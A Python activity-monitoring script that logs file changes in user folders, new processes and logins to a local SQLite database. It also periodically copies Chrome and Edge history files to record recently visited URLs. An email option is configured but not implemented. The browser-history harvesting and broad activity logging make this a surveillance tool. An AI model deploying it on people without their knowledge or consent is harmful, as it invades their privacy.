import os
import time
import psutil
import smtplib
import sqlite3
import shutil
from datetime import datetime
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from email.mime.text import MIMEText
from threading import Thread, Lock

# Database and Email Settings
DB_FILE = "activity_log.db"
EMAIL_ENABLED = False  # Set to True to enable email notifications
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
CHECK_INTERVAL = 10  # Time interval for checking processes and logins
FILE_LOG_COOLDOWN = 10  # Cooldown period for file event logging

# Directories to Monitor (Exclude System Directories)
USER_DIRS = [
    os.path.expanduser("~\\Documents"),
    os.path.expanduser("~\\Downloads"),
    os.path.expanduser("~\\Desktop"),
]

# Thread-safe lock for database access
db_lock = Lock()
last_logged_files = {}  # Cooldown tracker for file events

# Function to create the database if it doesn't exist
def create_database():
    with db_lock:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS logs
                     (timestamp TEXT, event_type TEXT, data TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS email_tracker 
                     (last_sent TEXT)''')  
        conn.commit()
        conn.close()

# Function to log events to the database
def log_event(event_type, details):
    try:
        with db_lock:
            conn = sqlite3.connect(DB_FILE, check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute("INSERT INTO logs (timestamp, event_type, data) VALUES (?, ?, ?)",
                           (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), event_type, details))
            conn.commit()
            conn.close()
        print(f"[LOGGED] {event_type} - {details}")
    except Exception as e:
        print(f"[ERROR] Logging failed: {e}")

# File event handler class
class FileMonitorHandler(FileSystemEventHandler):
    def on_modified(self, event):
        if not event.is_directory:
            self.log_file_event("MODIFIED", event.src_path)

    def on_created(self, event):
        if not event.is_directory:
            self.log_file_event("CREATED", event.src_path)

    def on_deleted(self, event):
        if not event.is_directory:
            self.log_file_event("DELETED", event.src_path)

    def on_moved(self, event):
        if not event.is_directory:
            self.log_file_event("MOVED", f"{event.src_path} → {event.dest_path}")

    def log_file_event(self, event_type, file_path):
        global last_logged_files
        current_time = time.time()

        # Exclude system directories
        if not any(file_path.startswith(user_dir) for user_dir in USER_DIRS):
            return
        
        # Prevent duplicate logging within cooldown period
        if file_path in last_logged_files:
            last_time = last_logged_files[file_path]
            if current_time - last_time < FILE_LOG_COOLDOWN:
                return  

        last_logged_files[file_path] = current_time  
        log_event(f"FILE {event_type}", file_path)

# Monitor running processes
def monitor_processes():
    tracked_processes = set()
    
    while True:
        try:
            current_processes = set(p.name() for p in psutil.process_iter())
            new_processes = current_processes - tracked_processes
            if new_processes:
                log_event("NEW PROCESSES", ', '.join(new_processes))

            tracked_processes = current_processes
            time.sleep(CHECK_INTERVAL)
        except Exception as e:
            print(f"[ERROR] Process monitoring error: {e}")
            time.sleep(5)

# Monitor user logins
def monitor_logins():
    logged_in_users = set()
    
    while True:
        try:
            users = psutil.users()
            for user in users:
                if user.name not in logged_in_users:
                    log_event("USER LOGIN", f"User {user.name} logged in")
                    logged_in_users.add(user.name)
            time.sleep(CHECK_INTERVAL)
        except Exception as e:
            print(f"[ERROR] Login monitoring error: {e}")
            time.sleep(5)

# Monitor browsing history (Chrome, Edge)
def get_browsing_history():
    browsers = {
        "Chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"),
        "Edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"),
    }

    while True:
        try:
            for browser, history_path in browsers.items():
                if os.path.exists(history_path):
                    extract_browser_history(browser, history_path)
            time.sleep(60)
        except Exception as e:
            print(f"[ERROR] Browsing history monitoring error: {e}")
            time.sleep(10)

# Extract browsing history from Chrome/Edge
def extract_browser_history(browser, history_path):
    try:
        temp_copy = history_path + "_temp"
        shutil.copy2(history_path, temp_copy)  # Copy file to avoid database lock

        conn = sqlite3.connect(temp_copy)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5")

        for row in cursor.fetchall():
            log_event(f"{browser} BROWSING", f"Visited {row[0]} - {row[1]}")

        conn.close()
        os.remove(temp_copy)  # Clean up temporary file
    except Exception as e:
        print(f"[ERROR] Failed to extract {browser} history: {e}")

# Start monitoring file system
def monitor_files():
    observers = []
    for path in USER_DIRS:
        if os.path.exists(path):
            event_handler = FileMonitorHandler()
            observer = Observer()
            observer.schedule(event_handler, path, recursive=True)
            observer.start()
            observers.append(observer)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        for observer in observers:
            observer.stop()
        for observer in observers:
            observer.join()

# Run all monitors
if __name__ == "__main__":
    create_database()

    # Start monitoring threads
    Thread(target=monitor_files, daemon=True).start()
    Thread(target=monitor_processes, daemon=True).start()
    Thread(target=monitor_logins, daemon=True).start()
    Thread(target=get_browsing_history, daemon=True).start()

    # Keep the main thread alive
    while True:
        time.sleep(10)
